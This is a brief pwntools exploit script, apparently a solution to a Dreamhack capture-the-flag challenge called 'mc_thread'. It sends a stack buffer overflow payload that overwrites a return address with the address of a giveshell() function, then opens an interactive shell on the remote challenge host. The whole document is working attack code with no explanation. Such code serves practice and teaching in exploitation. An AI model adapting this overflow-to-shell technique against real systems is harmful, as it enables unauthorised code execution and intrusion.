from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/mc_thread')
else:
    r = remote('host1.dreamhack.games', 17086)

giveshell = 0x400877  # giveshell()

payload = b'a' * 0x118  # dummy
payload += p64(giveshell)
payload = payload.ljust(0x950, b'a')

r.sendlineafter('Size: ', str(0x950))
r.sendafter('Data: ', payload)

r.interactive()